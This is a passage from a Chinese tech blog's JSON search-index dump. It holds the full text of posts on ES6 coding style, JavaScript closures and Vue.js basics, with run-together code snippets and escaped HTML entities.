重启nginx再访问，就可以正常访问了","categories":[{"name":"Back-end","slug":"Back-end","permalink":"https://ru23.com/categories/Back-end/"}],"tags":[{"name":"Nginx","slug":"Nginx","permalink":"https://ru23.com/tags/Nginx/"}]},{"title":"ES6编码风格","slug":"2017-04-es6-coding-style","date":"2017-04-14T06:24:08.000Z","updated":"2018-10-24T03:46:02.124Z","comments":true,"path":"note/67fe8f98.html","link":"","permalink":"https://ru23.com/note/67fe8f98.html","excerpt":"","text":"一、块级作用域 1.1 let取代var ES6提出了两个新的声明变量的命令：let和const。其中，let完全可以取代var，因为两者语义相同，而且let没有副作用 var命令存在变量提升效用，let命令没有这个问题 建议不再使用var命令，而是使用let命令取代 12345\"use strict\";if(true) &#123;console.log(x); // ReferenceErrorlet x = 'hello';&#125; 上面代码如果使用var替代let，console.log那一行就不会报错，而是会输出undefined，因为变量声明提升到代码块的头部。这违反了变量先声明后使用的原则 1.2 全局常量和线程安全 在let和const之间，建议优先使用const，尤其是在全局环境，不应该设置变量，只应设置常量。这符合函数式编程思想，有利于将来的分布式运算。 12345678910// badvar a = 1, b = 2, c = 3;// goodconst a = 1;const b = 2;const c = 3;// bestconst [a, b, c] = [1, 2, 3]; const声明常量还有两个好处，一是阅读代码的人立刻会意识到不应该修改这个值，二是防止了无意间修改变量值所导致的错误 所有的函数都应该设置为常量 let表示的变量，只应出现在单线程运行的代码中，不能是多线程共享的，这样有利于保证线程安全 1.3 严格模式 V8引擎只在严格模式之下，支持let和const。结合前两点，这实际上意味着，将来所有的编程都是针对严格模式的。 二、字符串 静态字符串一律使用单引号，不使用双引号。动态字符串使用反引号 123456789// badconst a = \"foobar\";const b = 'foo' + a + 'bar';// goodconst a = 'foobar';const b = `foo$&#123;a&#125;bar`;const c = 'foobar'; 三、解构赋值 使用数组成员对变量赋值，优先使用解构赋值 12345678const arr = [1, 2, 3, 4];// badconst first = arr[0];const second = arr[1];// goodconst [first, second] = arr; 函数的参数如果是对象的成员，优先使用解构赋值 1234567891011121314// badfunction getFullName(user) &#123;const firstName = user.firstName;const lastName = user.lastName;&#125;// goodfunction getFullName(obj) &#123;const &#123; firstName, lastName &#125; = obj;&#125;// bestfunction getFullName(&#123; firstName, lastName &#125;) &#123;&#125; 如果函数返回多个值，优先使用对象的解构赋值，而不是数组的解构赋值。这样便于以后添加返回值，以及更改返回值的顺序 12345678910// badfunction processInput(input) &#123;return [left, right, top, bottom];&#125;// goodfunction processInput(input) &#123;return &#123; left, right, top, bottom &#125;;&#125;const &#123; left, right &#125; = processInput(input); 四、对象 单行定义的对象，最后一个成员不以逗号结尾。多行定义的对象，最后一个成员以逗号结尾 12345678910111213// badconst a = &#123; k1: v1, k2: v2, &#125;;const b = &#123;k1: v1,k2: v2&#125;;// goodconst a = &#123; k1: v1, k2: v2 &#125;;const b = &#123;k1: v1,k2: v2,&#125;; 对象尽量静态化，一旦定义，就不得随意添加新的属性。如果添加属性不可避免，要使用Object.assign方法 1234567891011// badconst a = &#123;&#125;;a.x = 3;// if reshape unavoidableconst a = &#123;&#125;;Object.assign(a, &#123; x: 3 &#125;);// goodconst a = &#123; x: null &#125;;a.x = 3 如果对象的属性名是动态的，可以在创造对象的时候，使用属性表达式定义 12345678910111213// badconst obj = &#123;id: 5,name: 'San Francisco',&#125;;obj[getKey('enabled')] = true;'// goodconst obj = &#123;id: 5,name: 'San Francisco',[getKey('enabled')]: true,&#125;; 上面代码中，对象obj的最后一个属性名，需要计算得到。这时最好采用属性表达式，在新建obj的时候，将该属性与其他属性定义在一起。这样一来，所有属性就在一个地方定义了 另外，对象的属性和方法，尽量采用简洁表达法，这样易于描述和书写。 123456789101112131415161718ar ref = 'some value';// badconst atom = &#123;ref: ref,value: 1,addValue: function (value) &#123;return atom.value + value;&#125;,&#125;;// goodconst atom = &#123;ref,value: 1,addValue(value) &#123;return atom.value + value;&#125;,&#125;; 五、数组 使用扩展运算符（...）拷贝数组 12345678910// badconst len = items.length;const itemsCopy = [];let i;for (i = 0; i &lt; len; i++) &#123;itemsCopy[i] = items[i];&#125;// goodconst itemsCopy = [...items]; 使用Array.from方法，将类似数组的对象转为数组 12const foo = document.querySelectorAll('.foo');const nodes = Array.from(foo); 六、函数 立即执行函数可以写成箭头函数的形式 123(() =&gt; &#123;console.log('Welcome to the Internet.');&#125;)(); 那些需要使用函数表达式的场合，尽量用箭头函数代替。因为这样更简洁，而且绑定了this 123456789// bad[1, 2, 3].map(function (x) &#123;return x * x;&#125;);// good[1, 2, 3].map((x) =&gt; &#123;return x * x;&#125;); 箭头函数取代Function.prototype.bind，不应再用self/_this/that绑定 this 1234567891011// badconst self = this;const boundMethod = function(...params) &#123;return method.apply(self, params);&#125;// acceptableconst boundMethod = method.bind(this);// bestconst boundMethod = (...params) =&gt; method.apply(this, params); 所有配置项都应该集中在一个对象，放在最后一个参数，布尔值不可以直接作为参数 1234567// badfunction divide(a, b, option = false ) &#123;&#125;// goodfunction divide(a, b, &#123; option = false &#125; = &#123;&#125;) &#123;&#125; 不要在函数体内使用arguments变量，使用rest运算符（...）代替。因为rest运算符显式表明你想要获取参数，而且arguments是一个类似数组的对象，而rest运算符可以提供一个真正的数组 12345678910// badfunction concatenateAll() &#123;const args = Array.prototype.slice.call(arguments);return args.join('');&#125;// goodfunction concatenateAll(...args) &#123;return args.join('');&#125; 使用默认值语法设置函数参数的默认值 123456789// badfunction handleThings(opts) &#123;opts = opts || &#123;&#125;;&#125;// goodfunction handleThings(opts = &#123;&#125;) &#123;// ...&#125; 七、Map结构 注意区分Object和Map，只有模拟实体对象时，才使用Object。如果只是需要key:value的数据结构，使用Map。因为Map有内建的遍历机制 12345678910let map = new Map(arr);for (let key of map.keys()) &#123;console.log(key);&#125;for (let value of map.values()) &#123;console.log(value);&#125;for (let item of map.entries()) &#123;console.log(item[0], item[1]);&#125; 八、Class 总是用class，取代需要prototype操作。因为class的写法更简洁，更易于理解 123456789101112131415161718192021// badfunction Queue(contents = []) &#123;this._queue = [...contents];&#125;Queue.prototype.pop = function() &#123;const value = this._queue[0];this._queue.splice(0, 1);return value;&#125;// goodclass Queue &#123;constructor(contents = []) &#123;this._queue = [...contents];&#125;pop() &#123;const value = this._queue[0];this._queue.splice(0, 1);return value;&#125;&#125; 使用extends实现继承，因为这样更简单，不会有破坏instanceof运算的危险 12345678910111213141516// badconst inherits = require('inherits');function PeekableQueue(contents) &#123;Queue.apply(this, contents);&#125;inherits(PeekableQueue, Queue);PeekableQueue.prototype.peek = function() &#123;return this._queue[0];&#125;// goodclass PeekableQueue extends Queue &#123;peek() &#123;return this._queue[0];&#125;&#125; 九、模块 Module语法是JavaScript模块的标准写法，坚持使用这种写法。使用import取代require 1234567// badconst moduleA = require('moduleA');const func1 = moduleA.func1;const func2 = moduleA.func2;// goodimport &#123; func1, func2 &#125; from 'moduleA'; 使用export取代module.exports 1234567891011121314151617// commonJS的写法var React = require('react');var Breadcrumbs = React.createClass(&#123;render() &#123;return &lt;nav /&gt;;&#125;&#125;);module.exports = Breadcrumbs;// ES6的写法import React from 'react';const Breadcrumbs = React.createClass(&#123;render() &#123;return &lt;nav /&gt;;&#125;&#125;);export default Breadcrumbs 不要在模块输入中使用通配符。因为这样可以确保你的模块之中，有一个默认输出（export default） 12345// badimport * as myObject './importModule';// goodimport myObject from './importModule'; 如果模块默认输出一个函数，函数名的首字母应该小写 123function makeStyleGuide() &#123;&#125;export default makeStyleGuide; 如果模块默认输出一个对象，对象名的首字母应该大写 12345const StyleGuide = &#123;es6: &#123;&#125;&#125;;export default StyleGuide;","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"https://ru23.com/tags/Javascript/"},{"name":"ES6","slug":"ES6","permalink":"https://ru23.com/tags/ES6/"}]},{"title":"浅谈闭包","slug":"2017-03-closure-summary","date":"2017-03-22T06:24:08.000Z","updated":"2018-10-24T07:00:48.766Z","comments":true,"path":"note/56cde313.html","link":"","permalink":"https://ru23.com/note/56cde313.html","excerpt":"","text":"闭包的形成跟变量的作用域以及变量的生存周期密切相关 一、变量的作用域,是指变量的有效范围 当在函数中声明一个变量的时候,如果该变量前面没有带上关键字 var,这个变量就会成为全局变量 ,这当然是一种很容易造成命名冲突的做法。另外一种情况是用 var 关键字在函数中声明变量,这时候的变量即是局部变量,只有在该函数内部才能访问到这个变量,在函数外面是访问不到的。 例：变量的搜索是从内到外而非从外到 内的 123456789101112var a=1;var func1 = function()&#123; var b=2; var func2 = function()&#123; var c=3; console.log ( b ); // 输出:2 console.log ( a );// 输出:1 &#125; func2(); console.log(c);//输出:Uncaught ReferenceError: c is not defined&#125;; func1(); 二、变量的生存周期 对于全局变量来说,全局变量的生存周期当然是的永久,除非我们主动销毁这个全局变量。 而对于在函数内用var关键字声明的局部变量来说,当退出函数时,这些局部变量即失去了 它们的价值,它们都会随着函数的调用的结束而销毁 例一： 123456789101112var func = function()&#123; var a=1; return function()&#123; a++; console.log(a); &#125; &#125;;var f=func();f();// 输出:2 f();// 输出:3f();// 输出:4f();// 输出:5 跟我们之前的结论相反,上面的例子在当退出函数后,局部变量a 并没有消失,而是似乎一直在某个地方 存活着。这是因为当执行 var f = func();时,f 返回了一个名函数的引用,它可以问到func() 被调用时产生的环境,而局部变量 a 一直处在这个环境里。既然外局部变量所在的环境还能被外 界访问,这个局部变量就有了不被销毁的理由。在这里生了一个闭包结构,局部变量的声明看起来被延续了。 例二，假设页面上有 5 个 div 节点,我们通过循环来给每个 div绑定 onclick 事件,按照索引顺序,点击第 1 个 div 时弹出 0,点击第 2 个 div 时出 1,以此类 123456var nodes = document.getElementsByTagName( 'div' );for(var i=0,len=nodes.length;i&amp;lt;len;i++)&#123; nodes[ i ].onclick = function()&#123; alert(i); &#125;&#125;; 测试这段代码会发现,无论点击哪个 div,最后弹出的结果都是 5 这是因为 div 节点的 onclick 事件是被异步触发的,当事件被触发的时候,for循环早已结束,此时 i 的值已经是 5, 所以在 div的 onclick 事件函数中顺着作用域链从内到外查找变量 i 时,查找到的值总是 5。 解决方法是在闭包的帮助下,每次循环的i 值都封闭起来。当在事件函数中顺着作用域链从内到外查找变量 i时,会先找到被封闭在闭包环境中的i,如果有5个div,这里的i分别 是 0,1,2,3,4 1234567for(var i=0,len=nodes.length;i&amp;lt;len;i++)&#123; (function( i )&#123; nodes[ i ].onclick = function()&#123; console.log(i); &#125; &#125;)(i)&#125;; 三、闭包的作用1、封装变量—-闭包可以帮助一些不需要暴露在全局的变量封装成“私有变量” 例一，计算乘积 1234567var mult = function()&#123; var a=1; for(var i=0,l=arguments.length;i&amp;lt;l;i++)&#123; a = a * arguments[i]; &#125; return a; &#125;; 2、延续局部变量的寿命四、闭包与内存泄漏12345678910function a() &#123; var i = 0; function b() &#123; console.log(++i); &#125; return b;&#125;var c = a();c(); 首先有一个封闭的函数a（即自定义的一个function a()方法），该函数内部的变量b（局部变量/局部方法）外部无法直接调用；但如果把这个函数赋值给一个全部变量c时， 全局变量c就获取到了函数局部变量b的值，从而使局部变量b的值得到了保存，即延长了一个局部变量b的生命周期，除非主动销毁这个全局变量c。此时，我们也就制造出来了一个“闭包”。简单说“闭包是指有权限访问另一个函数作用域的变量的函数”。 在这个过程中，因为局部变量b的声明周期延长，使得Javascript的垃圾回收机制不会收回函数a所占用的资源,因为函数a的局部变量b的执行需要依赖函数a中的变量。","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"https://ru23.com/tags/Javascript/"},{"name":"闭包","slug":"闭包","permalink":"https://ru23.com/tags/闭包/"}]},{"title":"Vue学习总结(一)","slug":"2017-03-vue-summary-1","date":"2017-03-19T04:24:08.000Z","updated":"2018-10-24T03:46:02.119Z","comments":true,"path":"note/7c9df6a.html","link":"","permalink":"https://ru23.com/note/7c9df6a.html","excerpt":"","text":"一、介绍 Paste_Image.png Vue是一套构建用户界面的 渐进式框架。Vue 的核心库只关注视图层，并且非常容易学习，非常容易与其它库或已有项目整合。 二、Vue实例构造器 每个 Vue.js 应用都是通过构造函数 Vue 创建一个 Vue 的根实例 启动的 123var vm = new Vue(&#123;// 选项&#125;) 在实例化 Vue 时，需要传入一个选项对象，它可以包含数据、模板、挂载元素、方法、生命周期钩子等选项。全部的选项可以在 API 文档中查看 属性与方法 每个 Vue实例都会代理其data 对象里所有的属性 123456789101112var data = &#123; a: 1 &#125;var vm = new Vue(&#123;data: data&#125;)vm.a === data.a// -&gt; true// 设置属性也会影响到原始数据vm.a = 2data.a // -&gt; 2// ... 反之亦然data.a = 3vm.a // -&gt; 3 除了 data属性， Vue实例暴露了一些有用的实例属性与方法。这些属性与方法都有前缀 $，以便与代理的data属性区分。例如： 12345678910111213var data = &#123; a: 1 &#125;var vm = new Vue(&#123;el: '#example',data: data&#125;)vm.$data === data// -&gt; truevm.$el === document.getElementById('example')// -&gt; true// $watch 是一个实例方法vm.$watch('a', function (newVal, oldVal) &#123;// 这个回调将在 `vm.a` 改变后调用&#125;) 实例生命周期 12345678var vm = new Vue(&#123;data: &#123; a: 1 &#125;,created: function () &#123;// `this` 指向 vm 实例console.log('a is: ' + this.a)&#125;&#125;)// -&gt; \"a is: 1\" 也有一些其它的钩子，在实例生命周期的不同阶段调用，如 mounted 、 updated 、 destroyed 。钩子的 this 指向调用它的 Vue 实例。一些用户可能会问 Vue.js 是否有“控制器”的概念？答案是，没有。组件的自定义逻辑可以分布在这些钩子中 生命周期图示 三、模板语法 Vue.js 使用了基于 HTML 的模版语法，允许开发者声明式地将 DOM 绑定至底层 Vue 实例的数据。所有Vue.js 的模板都是合法的 HTML ，所以能被遵循规范的浏览器和 HTML 解析器解析。 在底层的实现上， Vue将模板编译成虚拟DOM 渲染函数。结合响应系统，在应用状态改变时， Vue 能够智能地计算出重新渲染组件的最小代价并应用到 DOM 操作上。 插值文本 数据绑定最常见的形式就是使用 “Mustache” 语法（双大括号）的文本插值 1&lt;span&gt;Message: &#123;&#123; msg &#125;&#125;&lt;/span&gt; Mustache 标签将会被替代为对应数据对象上 msg 属性的值。无论何时，绑定的数据对象上 msg 属性发生了改变，插值处的内容都会更新 通过使用 v-once 指令，你也能执行一次性地插值，当数据改变时，插值处的内容不会更新。但请留心这会影响到该节点上所有的数据绑定 1&lt;span v-once&gt;This will never change: &#123;&#123; msg &#125;&#125;&lt;/span&gt; 纯 HTML 双大括号会将数据解释为纯文本，而非 HTML 。为了输出真正的 HTML，你需要使用v-html指令： 1&lt;div v-html=\"rawHtml\"&gt;&lt;/div&gt; 被插入的内容都会被当做 HTML —— 数据绑定会被忽略 你的站点上动态渲染的任意 HTML 可能会非常危险，因为它很容易导致 XSS 攻击。请只对可信内容使用HTML 插值，绝不要对用户提供的内容插值 属性 Mustache 不能在 HTML 属性中使用，应使用 v-bind 指令： 1&lt;div v-bind:id=\"dynamicId\"&gt;&lt;/div&gt; 使用 JavaScript 表达式 对于所有的数据绑定， Vue.js都提供了完全的 JavaScript表达式支持。 123&#123;&#123; number + 1 &#125;&#125;&#123;&#123; ok ? 'YES' : 'NO' &#125;&#125;&#123;&#123; message.split('').reverse().join('') &#125;&#125;&lt;div v-bind:id=\"'list-' + id\"&gt;&lt;/div&gt; 这些表达式会在所属 Vue 实例的数据作用域下作为 JavaScript 被解析 过滤器 Vue.js 允许你自定义过滤器，被用作一些常见的文本格式化。过滤器应该被添加在mustache 插值的尾部，由“管道符”指示： 1&#123;&#123; message | capitalize &#125;&#125; 指令 指令（Directives）是带有v-前缀的特殊属性。指令属性的值预期是单一 JavaScript表达式（除了v-for ，之后再讨论） 指令的职责就是当其表达式的值改变时相应地将某些行为应用到 DOM 上 1&lt;p v-if=\"seen\"&gt;Now you see me&lt;/p&gt; 这里， v-if 指令将根据表达式 seen 的值的真假来移除/插入&lt;p&gt;元素 参数 一些指令能接受一个“参数”，在指令后以冒号指明。例如，v-bind指令被用来响应地更新 HTML 属性 1&lt;a v-bind:href=\"url\"&gt;&lt;/a&gt; 在这里 href是参数，告知v-bind 指令将该元素的 href 属性与表达式 url的值绑定 另一个例子是 v-on 指令，它用于监听 DOM 事件： 1&lt;a v-on:click=\"doSomething\"&gt; 修饰符 修饰符（Modifiers）是以半角句号.指明的特殊后缀，用于指出一个指令应该以特殊方式绑定 例如，.prevent 修饰符告诉 v-on 指令对于触发的事件调用 event.preventDefault() 1&lt;form v-on:submit.prevent=\"onSubmit\"&gt;&lt;/form&gt; 缩写 v- 前缀在模板中是作为一个标示 Vue 特殊属性的明显标识 Vue.js 为两个最为常用的指令提供了特别的缩写 v-bind 缩写 12&lt;!-- 完整语法 --&gt;&lt;a v-bind:href=\"url\"&gt;&lt;/a&gt;&lt;!-- 缩写 --&gt;&lt;a :href=\"url\"&gt;&lt;/a&gt; v-on 缩写 12345&lt;!-- 完整语法 --&gt;&lt;a v-on:click=\"doSomething\"&gt;&lt;/a&gt;&lt;!-- 缩写 --&gt;&lt;a @click=\"doSomething\"&gt;&lt;/a&gt; 四、计算属性 在模板中绑定表达式是非常便利的，但是它们实际上只用于简单的操作。在模板中放入太多的逻辑会让模板过重且难以维护。例如： 1&lt;div id=\"example\"&gt; &#123;&#123; message.split('').reverse().join('') &#125;&#125;&lt;/div&gt; 在这种情况下，模板不再简单和清晰。在实现反向显示 message 之前，你应该确认它。这个问题在你不止一次反向显示 message 的时候变得更加糟糕。 这就是为什么任何复杂逻辑，你都应当使用计算属性 基础例子 1234&lt;div id=\"example\"&gt; &lt;p&gt;Original message: \"&#123;&#123; message &#125;&#125;\"&lt;/p&gt; &lt;p&gt;Computed reversed message: \"&#123;&#123; reversedMessage &#125;&#125;\"&lt;/p&gt;&lt;/div&gt; 12345678var vm = new Vue(&#123; el: '#example', data: &#123; message: 'Hello' &#125;, computed: &#123; //a computed getter reversedMessage: function () &#123; // `this` points to the vm instance return this.message.split('').reverse().join('')&#125; &#125;&#125;) 结果： Original message: “Hello” Computed reversed message: “olleH” 这里我们声明了一个计算属性 reversedMessage 。我们提供的函数将用作属性 计算缓存 vs Methods 你可能已经注意到我们可以通过调用表达式中的method来达到同样的效果： 1&lt;p&gt;Reversed message: \"&#123;&#123; reverseMessage() &#125;&#125;\"&lt;/p&gt; 123456// in componentmethods: &#123;reverseMessage: function () &#123; return this.message.split(' ').reverse().join('') &#125;&#125; 不经过计算属性，我们可以在 method 中定义一个相同的函数来替代它。对于最终的结果，两种方式确实是相同的。然而，不同的是计算属性是基于它的依赖缓存。计算属性只有在它的相关依赖发生改变时才会重新取值。这就意味着只要 message 没有发生改变，多次访问reversedMessage 计算属性会立即返回之前的计算结果，而不必再次执行函数。 这也同样意味着如下计算属性将不会更新，因为 Date.now()不是响应式依赖： 1computed: &#123; now: function () &#123; return Date.now() &#125;&#125; 相比而言，每当重新渲染的时候，method 调用总会执行函数 我们为什么需要缓存？假设我们有一个重要的计算属性 A ，这个计算属性需要一个巨大的数组遍历和做大量的计算。然后我们可能有其他的计算属性依赖于 A 。如果没有缓存，我们将不可避免的多次执行 A 的 getter！如果你不希望有缓存，请用 method 替代 计算属性 vs Watched Property Vue.js 提供了一个方法$watch ，它用于观察 Vue实例上的数据变动 计算 setter 计算属性默认只有 getter，不过在需要时你也可以提供一个 setter： 123456789101112131415// ...computed: &#123;fullName: &#123; // getter get: function () &#123; return this.firstName + ' ' + this.lastName &#125;, // setter set: function (newValue) &#123; var names = newValue.split(' ') this.firstName = names[0] this.lastName = names[names.length - 1] &#125;&#125;&#125; 现在在运行vm.fullName = &#39;John Doe&#39; 时， setter会被调用， vm.firstName 和vm.lastName 也会被对应更新 观察 Watchers 虽然计算属性在大多数情况下更合适，但有时也需要一个自定义的 watcher 。这是为什么 Vue 提供一个更通用的方法通过 watch 选项，来响应数据的变化。当你想要在数据变化响应时，执行异步操作或昂贵操作时，这是很有用的 五、Class与Style绑定Class 与 Style 绑定 数据绑定一个常见需求是操作元素的 class 列表和它的内联样式。因为它们都是属性 ，我们可以用 v-bind处理它们：只需要计算出表达式最终的字符串。不过，字符串拼接麻烦又易错。因此，在 v-bind 用于class 和 style时， Vue.js 专门增强了它。表达式的结果类型除了字符串之外，还可以是对象或数组 绑定 HTML Class对象语法 我们可以传给v-bind:class 一个对象，以动态地切换 class 1&lt;div v-bind:class=\"&#123; active: isActive &#125;\"&gt;&lt;/div&gt; 上面的语法表示class active的更新将取决于数据属性isActive 是否为真值 我们也可以在对象中传入更多属性用来动态切换多个class。此外， v-bind:class 指令可以与普通的class 属性共存。如下模板: 1&lt;div class=\"static\" v-bind:class=\"&#123; active: isActive, 'text-danger': hasError &#125;\"&gt;&lt;/div&gt; 如下 data: 1data: &#123; isActive: true, hasError: false&#125; 渲染为: 1&lt;div class=\"static active\"&gt;&lt;/div&gt; 当 isActive 或者 hasError 变化时，class 列表将相应地更新。例如，如果 hasError的值为true ， class列表将变为&quot;static active text-danger&quot; 你也可以直接绑定数据里的一个对象 1&lt;div v-bind:class=\"classObject\"&gt;&lt;/div&gt; 1data: &#123; classObject: &#123; active: true, 'text-danger': false &#125;&#125; 数组语法 我们可以把一个数组传给 v-bind:class ，以应用一个 class 列表 1&lt;div v-bind:class=\"[activeClass, errorClass]\"&gt; 1data: &#123; activeClass: 'active', errorClass: 'text-danger'&#125; 渲染为: 1&lt;div class=\"active text-danger\"&gt;&lt;/div&gt; 如果你也想根据条件切换列表中的 class ，可以用三元表达式 1&lt;div v-bind:class=\"[isActive ? activeClass : '', errorClass]\"&gt; 绑定内联样式对象语法 v-bind:style 的对象语法十分直观——看着非常像CSS ，其实它是一个 JavaScript 对象。 CSS 属性名可以用驼峰式（camelCase）或短横分隔命名（kebab-case） 123&lt;div v-bind:style=\"&#123; color: activeColor, fontSize: fontSize + 'px' &#125;\"&gt;&lt;/div&gt; 1data: &#123; activeColor: 'red', fontSize: 30&#125; 直接绑定到一个样式对象通常更好，让模板更清晰 1&lt;div v-bind:style=\"styleObject\"&gt;&lt;/div&gt; 1data: &#123; styleObject: &#123; color: 'red', fontSize: '13px' &#125;&#125; 数组语法 v-bind:style 的数组语法可以将多个样式对象应用到一个元素上 1&lt;div v-bind:style=\"[baseStyles, overridingStyles]\"&gt; 自动添加前缀 当 v-bind:style 使用需要特定前缀的 CSS 属性时，如 transform ，Vue.js会自动侦测并添加相应的前缀 六、条件渲染v-if 在字符串模板中，如 Handlebars，我们得像这样写一个条件块 12&lt;!-- Handlebars 模板 --&gt;&#123;&#123;#if ok&#125;&#125; &lt;h1&gt;Yes&lt;/h1&gt;&#123;&#123;/if&#125;&#125; 在 Vue.js，我们使用 v-if指令实现同样的功能 1&lt;h1 v-if=\"ok\"&gt;Yes&lt;/h1&gt; 也可以用 v-else添加一个 “else”块 1&lt;h1 v-if=\"ok\"&gt;Yes&lt;/h1&gt;&lt;h1 v-else&gt;No&lt;/h1&gt; template v-if 因为 v-if 是一个指令，需要将它添加到一个元素上。但是如果我们想切换多个元素呢？此时我们可以把一个 &lt;template&gt; 元素当做包装元素，并在上面使用 v-if ，最终的渲染结果不会包含它 1&lt;template v-if=\"ok\"&gt; &lt;h1&gt;Title&lt;/h1&gt; &lt;p&gt;Paragraph 1&lt;/p&gt; &lt;p&gt;Paragraph 2&lt;/p&gt;&lt;/template&gt; v-else 可以用 v-else指令给 v-if或 v-show 添加一个 “else” 块 1&lt;div v-if=\"Math.random() &gt; 0.5\"&gt; Sorry&lt;/div&gt;&lt;div v-else&gt; Not sorry&lt;/div&gt; v-else 元素必须紧跟在v-if或 v-show 元素的后面——否则它不能被识别 v-show 另一个根据条件展示元素的选项是v-show指令。用法大体上一样 1&lt;h1 v-show=\"ok\"&gt;Hello!&lt;/h1&gt; 不同的是有 v-show 的元素会始终渲染并保持在 DOM 中。 v-show是简单的切换元素的 CSS 属性display 注意 v-show 不支持 &lt;template&gt; 语法 v-if vs. v-show v-if 是真实的条件渲染，因为它会确保条件块在切换当中适当地销毁与重建条件块内的事件监听器和子组件 v-if也是惰性的：如果在初始渲染时条件为假，则什么也不做 相比之下， v-show 简单得多——元素始终被编译并保留，只是简单地基于 CSS 切换 一般来说， v-if有更高的切换消耗而 v-show 有更高的初始渲染消耗 因此，如果需要频繁切换使用v-show较好，如果在运行时条件不大可能改变则使用v-if较好 七、列表渲染v-for 我们用 v-for指令根据一组数组的选项列表进行渲染。v-for指令需要以 item in items 形式的特殊语法， items 是源数据数组并且 item 是数组元素迭代的别名 在 v-for 块中，我们拥有对父作用域属性的完全访问权限。 v-for 还支持一个可选的第二个参数为当前项的索引 12345&lt;ul id=\"example-2\"&gt; &lt;li v-for=\"(item, index) in items\"&gt; &#123;&#123; parentMessage &#125;&#125; - &#123;&#123; index &#125;&#125; - &#123;&#123; item.message &#125;&#125; &lt;/li&gt;&lt;/ul&gt; 你也可以用 of替代 in作为分隔符，因为它是最接近 JavaScript 迭代器的语法 1&lt;div v-for=\"item of items\"&gt;&lt;/div&gt; Template v-for 如同 v-if模板，你也可以用带有 v-for 的 &lt;template&gt;标签来渲染多个元素块。例如：123456&lt;ul&gt; &lt;template v-for=\"item in items\"&gt; &lt;li&gt;&#123;&#123; item.msg &#125;&#125;&lt;/li&gt; &lt;li class=\"divider\"&gt;&lt;/li&gt; &lt;/template&gt;&lt;/ul&gt; 对象迭代 v-for 你也可以用v-for 通过一个对象的属性来迭代 123&lt;ul id=\"repeat-object\" class=\"demo\"&gt; &lt;li v-for=\"value in object\"&gt; &#123;&#123; value &#125;&#125; &lt;/li&gt;&lt;/ul&gt; 12345678new Vue(&#123; el: '#repeat-object', data: &#123; object: &#123; FirstName: 'John', LastName: 'Doe', Age: 30 &#125; &#125;&#125;) 你也可以提供第二个的参数为键名 1&lt;div v-for=\"(value, key) in object\"&gt; &#123;&#123; key &#125;&#125; : &#123;&#123; value &#125;&#125;&lt;/div&gt; 第三个参数为索引 123&lt;div v-for=\"(value, key, index) in object\"&gt; &#123;&#123; index &#125;&#125;. &#123;&#123; key &#125;&#125; : &#123;&#123; value &#125;&#125;&lt;/div&gt; 整数迭代 v-for v-for 也可以取整数。在这种情况下，它将重复多次模板 123&lt;div&gt; &lt;span v-for=\"n in 10\"&gt;&#123;&#123; n &#125;&#125;&lt;/span&gt;&lt;/div&gt; 结果： 1 2 3 4 5 6 7 8 9 10 组件 和 v-for 在自定义组件里，你可以像任何普通元素一样用 v-for 1&lt;my-component v-for=\"item in items\"&gt;&lt;/my-component&gt; 然而他不能自动传递数据到组件里，因为组件有自己独立的作用域。为了传递迭代数据到组件里，我们要用props 123&lt;my-component v-for=\"(item, index) in items\" v-bind:item=\"item\" v-bind:index=\"index\"&gt;&lt;/my-component&gt;&gt; 不自动注入 item到组件里的原因是，因为这使得组件会紧密耦合到 v-for如何运作。在一些情况下，明确数据的来源可以使组件可重用。 八、事件处理器监听事件 可以用 v-on 指令监听 DOM 事件来触发一些 JavaScript 代码 1234&lt;div id=\"example-1\"&gt; &lt;button v-on:click=\"counter += 1\"&gt;增加 1&lt;/button&gt; &lt;p&gt;这个按钮被点击了 &#123;&#123; counter &#125;&#125; 次。&lt;/p&gt;&lt;/div&gt; 12345var example1 = new Vue(&#123; el: '#example-1', data: &#123; counter: 0 &#125;&#125;) 方法事件处理器 许多事件处理的逻辑都很复杂，所以直接把 JavaScript 代码写在 v-on 指令中是不可行的。因此 v-on 可以接收一个定义的方法来调用 内联处理器方法 除了直接绑定到一个方法，也可以用内联 JavaScript语句 1234&lt;div id=\"example-3\"&gt; &lt;button v-on:click=\"say('hi')\"&gt;Say hi&lt;/button&gt; &lt;button v-on:click=\"say('what')\"&gt;Say what&lt;/button&gt;&lt;/div&gt; 1234567new Vue(&#123;el: '#example-3', methods: &#123; say: function (message) &#123; alert(message) &#125;&#125;&#125;) 有时也需要在内联语句处理器中访问原生 DOM 事件。可以用特殊变量 $event把它传入方法 123&lt;button v-on:click=\"warn('Form cannot be submitted yet.', $event)\"&gt;Submit&lt;/button&gt; 12345678methods: &#123;warn: function (message, event) &#123;// 现在我们可以访问原生事件对象 if(event) &#123; event.preventDefault() alert(message) &#125;&#125;&#125; 事件修饰符 在事件处理程序中调用event.preventDefault()或event.stopPropagation()是非常常见的需求。尽管我们可以在methods 中轻松实现这点，但更好的方式是：methods 只有纯粹的数据逻辑，而不是去处理DOM 事件细节 为了解决这个问题， Vue.js 为 v-on提供了 事件修饰符。通过由点(.)表示的指令后缀来调用修饰符 .stop .prevent .capture .self 1234567891011121314151617&lt;!-- 阻止单击事件冒泡 --&gt;&lt;a v-on:click.stop=\"doThis\"&gt;&lt;/a&gt;&lt;!-- 提交事件不再重载页面 --&gt;&lt;form v-on:submit.prevent=\"onSubmit\"&gt;&lt;/form&gt;&lt;!-- 修饰符可以串联 --&gt;&lt;a v-on:click.stop.prevent=\"doThat\"&gt;&lt;/a&gt;&lt;!-- 只有修饰符 --&gt;&lt;form v-on:submit.prevent&gt;&lt;/form&gt;&lt;!-- 添加事件侦听器时使用时间捕获模式 --&gt;&lt;div v-on:click.capture=\"doThis\"&gt;...&lt;/div&gt;&lt;!-- 只当事件在该元素本身（而不是子元素）触发时触发回调 --&gt;&lt;div v-on:click.self=\"doThat\"&gt;...&lt;/div&gt; 按键修饰符 在监听键盘事件时，我们经常需要监测常见的键值。 Vue允许为 v-on在监听键盘事件时添加按键修饰符： 12&lt;!-- 只有在 keyCode 是 13 时调用 vm.submit() --&gt;&lt;input v-on:keyup.13=\"submit\"&gt; 记住所有的 keyCode比较困难，所以 Vue为最常用的按键提供了别名 12345&lt;!-- 同上 --&gt;&lt;input v-on:keyup.enter=\"submit\"&gt;&lt;!-- 缩写语法 --&gt;&lt;input @keyup.enter=\"submit\"&gt; 